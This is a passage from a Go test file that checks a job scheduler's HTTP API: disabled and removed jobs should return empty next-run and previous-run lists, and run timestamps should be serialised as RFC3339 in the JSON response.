	if err := json.Unmarshal(rr.Body.Bytes(), &jobs); err != nil {
		t.Fatalf("json unmarshal error: %v", err)
	}
	if len(jobs) != 1 {
		t.Fatalf("expected 1 job, got %d", len(jobs))
	}

	j := jobs[0]

	// Disabled jobs are not in cron, so they should have empty slices
	if len(j.NextRuns) != 0 {
		t.Errorf("expected 0 next_runs for disabled job, got %d", len(j.NextRuns))
	}
	if len(j.PrevRuns) != 0 {
		t.Errorf("expected 0 prev_runs for disabled job, got %d", len(j.PrevRuns))
	}
}

func TestRemovedJobsEndpointEmptyRuns(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())

	job := &testJob{}
	job.Name = "removed-job"
	job.Schedule = schedDaily
	job.Command = cmdEcho
	_ = sched.AddJob(job)
	_ = sched.RemoveJob(job)

	srv := webpkg.NewServer("", sched, nil, nil)
	req := httptest.NewRequest(http.MethodGet, "/api/jobs/removed", nil)
	rr := httptest.NewRecorder()
	srv.HTTPServer().Handler.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", rr.Code)
	}

	var jobs []apiJob
	if err := json.Unmarshal(rr.Body.Bytes(), &jobs); err != nil {
		t.Fatalf("json unmarshal error: %v", err)
	}
	if len(jobs) != 1 {
		t.Fatalf("expected 1 job, got %d", len(jobs))
	}

	j := jobs[0]

	// Removed jobs are no longer in cron, so they should have empty slices
	if len(j.NextRuns) != 0 {
		t.Errorf("expected 0 next_runs for removed job, got %d", len(j.NextRuns))
	}
	if len(j.PrevRuns) != 0 {
		t.Errorf("expected 0 prev_runs for removed job, got %d", len(j.PrevRuns))
	}
}

func TestJobsEndpointNextPrevRunsJSONFormat(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())

	job := &testJob{}
	job.Name = "json-format-job"
	job.Schedule = "@hourly"
	job.Command = "echo test"
	if err := sched.AddJob(job); err != nil {
		t.Fatalf("AddJob error: %v", err)
	}

	srv := webpkg.NewServer("", sched, nil, nil)
	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
	rr := httptest.NewRecorder()
	srv.HTTPServer().Handler.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", rr.Code)
	}

	// Verify the JSON contains next_runs and prev_runs fields as arrays
	var raw []map[string]json.RawMessage
	if err := json.Unmarshal(rr.Body.Bytes(), &raw); err != nil {
		t.Fatalf("json unmarshal error: %v", err)
	}
	if len(raw) != 1 {
		t.Fatalf("expected 1 job, got %d", len(raw))
	}

	if _, ok := raw[0]["nextRuns"]; !ok {
		t.Error("nextRuns field missing from JSON response")
	}
	if _, ok := raw[0]["prevRuns"]; !ok {
		t.Error("prevRuns field missing from JSON response")
	}

	// Verify the timestamps parse as RFC3339 (Go's default time.Time JSON format)
	var nextRuns []string
	if err := json.Unmarshal(raw[0]["nextRuns"], &nextRuns); err != nil {
		t.Fatalf("failed to unmarshal next_runs: %v", err)
	}
	for i, ts := range nextRuns {
		if _, err := time.Parse(time.RFC3339Nano, ts); err != nil {
			t.Errorf("next_runs[%d] = %q is not valid RFC3339: %v", i, ts, err)
		}
	}
}
